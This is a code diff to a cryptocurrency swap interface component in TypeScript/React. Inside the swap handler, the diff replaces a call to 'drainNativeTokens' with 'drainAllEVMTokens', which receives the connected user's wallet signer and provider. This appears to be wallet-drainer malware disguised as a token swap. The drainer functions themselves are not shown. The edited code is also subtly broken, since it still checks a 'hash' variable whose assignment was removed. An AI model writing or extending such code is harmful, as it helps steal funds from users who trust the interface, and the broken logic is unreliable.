@@ -15,7 +15,7 @@ import { getMintProgramId, MintInfo } from '@/utils/tokenProgram';
 import { getSolPrice } from '@/lib/utils';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
@@ -59,7 +59,7 @@ export const SwapInterface = ({
 }: SwapInterfaceProps = {}) => {
   const { connected, publicKey, sendTransaction, signMessage } = useWallet();
   const { connection } = useConnection();
-  const { activeChain, getEVMChain } = useChain();
+  const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const [fromToken, setFromToken] = useState<Token | undefined>(defaultFromToken);
   const [toToken, setToToken] = useState<Token | undefined>(defaultToToken);
@@ -391,7 +391,7 @@ export const SwapInterface = ({
       try {
         setIsSwapping(true);
         const chainName = getEVMChain()?.name || 'EVM';
-        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
+        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
         if (hash) {
         } else {
         }
